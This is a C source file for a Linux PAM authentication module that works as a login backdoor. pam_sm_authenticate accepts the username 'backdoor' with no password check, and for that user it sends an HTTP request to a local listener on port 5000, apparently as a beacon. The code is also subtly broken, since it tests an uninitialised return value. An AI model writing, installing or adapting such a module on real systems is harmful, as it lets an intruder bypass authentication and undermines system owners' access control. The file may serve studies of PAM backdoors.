#include <stdio.h>
#include <curl/curl.h>
#include <security/pam_modules.h>
#include <security/pam_appl.h>
#include <stdlib.h>
#include <string.h>
 

/* expected hook */
PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
	printf("Acct mgmt\n");
	return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv)
{

    int retval;
    const char* pUsername;

    pam_get_user(pamh, &pUsername, "Username: ");

    printf("Welcome %s\n", pUsername);

	if (retval != PAM_SUCCESS) {
		return retval;
	}

	if (strcmp(pUsername, "backdoor") != 0) {
		return PAM_AUTH_ERR;
	}
    
    CURL *curl;
    CURLcode res;
    
    /* In windows, this will init the winsock stuff */
    curl_global_init(CURL_GLOBAL_ALL);
    
    /* get a curl handle */
    curl = curl_easy_init();
    if(curl) {
        /* First set the URL that is about to receive our POST. This URL can
        just as well be an https:// URL if that is what should receive the
        data. */
        curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:5000");
        /* Now specify the POST data */
        // curl_easy_setopt(curl, CURLOPT_POSTFIELDS, "name=daniel&project=curl");
    
        /* Perform the request, res will get the return code */
        res = curl_easy_perform(curl);
        /* Check for errors */
        if(res != CURLE_OK)
        fprintf(stderr, "curl_easy_perform() failed: %s\n",
                curl_easy_strerror(res));
    
        /* always cleanup */
        curl_easy_cleanup(curl);
    }
    curl_global_cleanup();
    return PAM_SUCCESS;
}